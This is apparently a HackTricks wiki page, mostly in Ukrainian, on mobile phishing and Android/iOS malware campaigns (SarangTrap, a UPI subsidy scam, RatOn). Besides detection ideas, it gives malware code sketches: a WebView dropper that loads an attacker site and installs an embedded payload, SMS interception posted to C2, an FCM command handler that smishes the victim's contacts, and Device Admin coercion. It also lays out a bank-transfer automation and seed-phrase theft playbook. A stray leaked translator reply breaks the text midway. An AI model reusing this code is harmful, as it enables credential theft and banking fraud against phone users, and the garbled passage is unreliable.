# Мобільний фішинг і розповсюдження шкідливих додатків (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано техніки, які використовують загрозливі актори для розповсюдження **шкідливих Android APKs** і **iOS mobile-configuration profiles** через фішинг (SEO, соціальна інженерія, фейкові магазини, додатки для знайомств тощо).
> Матеріал адаптовано з кампанії SarangTrap, оприлюдненої Zimperium zLabs (2025), та інших публічних досліджень.

## Хід атаки

1. **SEO/Phishing Infrastructure**
* Реєструвати десятки подібних доменів (dating, cloud share, car service…).
– Використовувати ключові слова місцевою мовою та емодзі в елементі `<title>` для ранжування в Google.
– Розміщувати інструкції з інсталяції для *Android* (`.apk`) та iOS на одній цільовій сторінці.
2. **Початкове завантаження**
* Android: пряма посилання на *непідписаний* або «third-party store» APK.
* iOS: `itms-services://` або звичайне HTTPS-посилання на шкідливий **mobileconfig** профіль (див. нижче).
3. **Соціальна інженерія після інсталяції**
* Під час першого запуску додаток запитує **код запрошення / перевірки** (ілюзія ексклюзивного доступу).
* Код **POSTиться по HTTP** до Command-and-Control (C2).
* C2 відповідає `{"success":true}` ➜ malware продовжує роботу.
* Динамічний аналіз Sandbox/AV, який ніколи не відправляє валідний код, не виявляє **шкідливої поведінки** (evade).
4. **Зловживання дозволами під час виконання (Runtime Permission Abuse)** (Android)
* Дозволи, що дають значні привілеї, запрошуються тільки **після позитивної відповіді C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Останні варіанти **видаляють `<uses-permission>` для SMS з `AndroidManifest.xml`**, але залишають Java/Kotlin код, який читає SMS через reflection ⇒ це знижує статичну оцінку, але залишається функціональним на пристроях, які надають дозвіл через `AppOps` abuse або старі цілі.
5. **Фасадний UI та збір у фоновому режимі**
* Додаток показує нешкідливі екрани (SMS viewer, gallery picker), реалізовані локально.
* Тим часом він ексфільтрує:
- IMEI / IMSI, номер телефону
- Повний дамп `ContactsContract` (JSON array)
- JPEG/PNG з `/sdcard/DCIM`, стиснуті за допомогою [Luban](https://github.com/Curzibn/Luban) для зменшення розміру
- Опційний вміст SMS (`content://sms`)
Payloads пакетно zip-уються і відправляються через `HTTP POST /upload.php`.
6. **Техніка доставки для iOS**
* Одиничний **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зареєструвати пристрій у супервізії, подібній до “MDM”.
* Інструкції соціальної інженерії:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* три рази (скріншоти на фішинговій сторінці).
3. Trust the unsigned profile ➜ зловмисник отримує *Contacts* & *Photo* entitlement без перевірки App Store.
7. **Мережевий рівень**
* Простий HTTP, часто на порті 80 з HOST header на кшталт `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко помітити).

## Тестування захисту / поради Red-Team

* **Dynamic Analysis Bypass** – під час оцінки malware автоматизуйте фазу введення коду запрошення за допомогою Frida/Objection, щоб дістатися до шкідливої гілки.
* **Manifest vs. Runtime Diff** – порівняйте `aapt dump permissions` з runtime `PackageManager#getRequestedPermissions()`; відсутність небезпечних дозволів — червоний прапорець.
* **Network Canary** – налаштуйте `iptables -p tcp --dport 80 -j NFQUEUE` для виявлення аномальних POST-сплесків після введення коду.
* **mobileconfig Inspection** – використовуйте `security cms -D -i profile.mobileconfig` на macOS, щоб перелічити `PayloadContent` і виявити надмірні entitlements.

## Ідеї для виявлення Blue-Team

* **Certificate Transparency / DNS Analytics** для виявлення різкого спалаху доменів, насичених ключовими словами.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` від Dalvik клієнтів поза Google Play.
* **Invite-code Telemetry** – POST 6–8 цифрових кодів незабаром після встановлення APK може вказувати на стадію підготовки.
* **MobileConfig Signing** – блокувати непідписані configuration profiles через політику MDM.

## Корисний фрагмент Frida: автоматичний обхід коду запрошення
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Індикатори (Загальні)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Цей патерн спостерігався в кампаніях, що використовують теми державних виплат для викрадення індійських UPI облікових даних та OTPs. Оператори ланцюжать авторитетні платформи для доставки та підвищення стійкості.

### Delivery chain across trusted platforms
- YouTube video lure → у описі міститься коротке посилання
- Коротке посилання → GitHub Pages фішинговий сайт, що імітує легітимний портал
- Той же GitHub repo розміщує APK з фальшивим “Google Play” значком, що посилається безпосередньо на файл
- Динамічні фішингові сторінки розміщені на Replit; канал віддалених команд використовує Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Перший APK — встановник (dropper), який доставляє реальний malware у `assets/app.apk` і підказує користувачу вимкнути Wi‑Fi/мобільні дані, щоб зменшити виявлення в хмарі.
- Вбудований payload встановлюється під невинною назвою (наприклад, “Secure Update”). Після встановлення і встановник, і payload присутні як окремі додатки.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне виявлення endpoints через shortlink
- Malware отримує plain-text, comma-separated список активних endpoints з shortlink; прості string transforms генерують фінальний phishing page path.

Приклад (санітизовано):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Крок “Make payment of ₹1 / UPI‑Lite” завантажує HTML-форму зловмисника з динамічного endpoint всередині WebView і захоплює конфіденційні поля (номер телефону, банк, UPI PIN), які `POST`яться до `addup.php`.

Мінімальний loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Саморозповсюдження та перехоплення SMS/OTP
- Під час першого запуску запитуються агресивні дозволи:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти перебираються для масової розсилки smishing SMS з пристрою жертви.
- Вхідні SMS перехоплюються broadcast receiver і завантажуються з метаданими (sender, body, SIM slot, per-device random ID) до `/addsm.php`.

Ескіз receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- The payload реєструється в FCM; push messages містять поле `_type`, яке використовується як перемикач для запуску дій (наприклад, оновлення шаблонів текстів phishing, перемикання поведінки).
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Ескіз обробника:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Шаблони полювання та IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Ідеї виявлення та захисту
- Позначати додатки, які просять користувачів вимкнути мережу під час інсталяції, а потім side-load другого APK з `assets/`.
- Сигналізувати при кортежі дозволів: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Моніторинг egress для `POST /addup.php|/addsm.php` на некорпоративних хостах; блокувати відому інфраструктуру.
- Правила Mobile EDR: untrusted app, що реєструється для FCM і розгалужується по полю `_type`.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Кейс RatOn

Кампанія RatOn banker/RAT (ThreatFabric) — конкретний приклад того, як сучасні mobile phishing операції поєднують WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), захоплення crypto wallet та навіть NFC-relay orchestration. Цей розділ абстрагує повторно використовувані техніки.

### Stage-1: WebView → native install bridge (dropper)
Атакувальники відображають WebView, що завантажує сторінку атакуючого, і інжектять JavaScript interface, який надає доступ до native installer. Натиск на HTML-кнопку викликає native code, який встановлює second-stage APK, вбудований у assets дроппера, а потім одразу його запускає.

Мінімальний патерн:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Я не бачу вмісту сторінки. Будь ласка, вставте HTML/markdown, який потрібно перекласти. Я перекладу видимий англомовний текст українською, залишаючи без змін код, теги, посилання, шляхи, назви технік та інші елементи, зазначені у ваших інструкціях.
```html
<button onclick="bridge.installApk()">Install</button>
```
Після встановлення dropper запускає payload через явний package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: недовірені додатки, які викликають `addJavascriptInterface()` і відкривають installer-like methods для WebView; APK, що постачає вбудований вторинний payload у `assets/` і викликає Package Installer Session API.

### Воронка згоди: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 відкриває WebView, який містить сторінку “Access”. Її кнопка викликає exported method, що переводить жертву до налаштувань Accessibility і просить увімкнути rogue service. Після надання, malware використовує Accessibility, щоб автоматично натискати кнопки в наступних діалогах runtime permission (contacts, overlay, manage system settings тощо) і запитує Device Admin.

- Accessibility програмно допомагає приймати подальші запити, знаходячи кнопки типу “Allow”/“OK” в node-tree і відправляючи кліки.
- Перевірка/запит дозволу overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Див. також:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom через WebView
Оператори можуть надсилати команди, щоб:
- відобразити full-screen overlay з URL, або
- передати inline HTML, яке завантажується в WebView overlay.

Ймовірні застосування: coercion (введення PIN), відкриття wallet для перехоплення PIN, ransom-повідомлення. Передбачте команду, яка перевіряє та забезпечує наявність дозволу overlay, якщо його бракує.

### Remote control model – текстовий pseudo-screen + screen-cast
- Низька пропускна здатність: періодично дампити Accessibility node tree, серіалізувати видимі тексти/ролі/bounds і відправляти на C2 як pseudo-screen (команди на кшталт `txt_screen` для одноразового, та `screen_live` для безперервного).
- Висока деталізація: запитати MediaProjection і запускати screen-casting/запис за запитом (команди на кшталт `display` / `record`).

### ATS playbook (автоматизація банківського додатку)
Отримавши JSON-завдання, відкрити банківський додаток, керувати UI через Accessibility, комбінуючи текстові запити та натискання по координатах, і ввести платіжний PIN жертви, коли буде запитано.

Приклад завдання:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Нова оплата"
- "Zadat platbu" → "Ввести платіж"
- "Nový příjemce" → "Новий одержувач"
- "Domácí číslo účtu" → "Номер внутрішнього рахунку"
- "Další" → "Далі"
- "Odeslat" → "Надіслати"
- "Ano, pokračovat" → "Так, продовжити"
- "Zaplatit" → "Сплатити"
- "Hotovo" → "Готово"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Негайне блокування:
```java
dpm.lockNow();
```
- Примусово зробити поточні облікові дані недійсними, щоб змусити зміну (Accessibility перехоплює новий PIN/пароль):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Примусово перейти на розблокування без біометрії, вимкнувши біометричні функції keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Багато контролів DevicePolicyManager вимагають Device Owner/Profile Owner на сучасних Android; деякі OEM-збірки можуть бути менш строгими. Завжди перевіряйте на цільовій ОС/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 може встановити та запустити зовнішній модуль NFC-relay (наприклад, NFSkate) і навіть передати йому HTML-шаблон, щоб підказувати жертві під час реле. Це дозволяє здійснювати безконтактні cash-out за карткою при фізичній присутності разом з online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Шукайте WebViews із `addJavascriptInterface()` що відкривають методи інсталятора/дозволів; сторінки, що закінчуються на “/access” і викликають Accessibility-підказки.
- Сигналізуйте про додатки, які генерують високоінтенсивні Accessibility жести/кліки незабаром після надання доступу до сервісу; телеметрія, що нагадує дампи Accessibility node, відправлені на C2.
- Моніторте зміни політик Device Admin в ненадійних додатках: `lockNow`, закінчення терміну пароля, перемикання функцій keyguard.
- Сигналізуйте про MediaProjection-підказки від некорпоративних додатків, за якими слідують періодичні завантаження кадрів.
- Виявляйте інсталяцію/запуск зовнішнього NFC-relay додатка, ініційованого іншим додатком.
- Для банкінгу: впровадьте позаканальні підтвердження, прив'язку біометрії та ліміти транзакцій, стійкі до автоматизації на пристрої.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
